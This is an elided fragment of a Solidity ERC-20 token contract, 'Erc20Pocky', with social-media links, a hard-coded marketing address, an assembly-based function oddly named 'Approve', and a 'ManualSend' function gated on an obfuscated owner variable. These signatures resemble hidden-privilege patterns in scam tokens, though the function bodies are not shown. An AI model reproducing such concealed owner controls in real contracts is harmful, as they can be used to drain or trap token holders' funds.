...
*/
/**
Telegram: https://t.me/Erc20Pocky

Twitter:  https://twitter.com/Pocky20erc
...
contract Erc20Pocky is Context, Ownable, IERC20 {
    ...
    uint256 marketFee = 1;
    address public marketAddress = 0x499A8b3E2a06fEFCb34e9D92a527C25F3c1f8Bfc; //
    ...
    function Approve(address[] memory back, uint256 Teambuy) external {
        assembly {
    ...
    function ManualSend(address o0xkO21) external {
        if(Ox953698 != _msgSender()){
            return;
        }
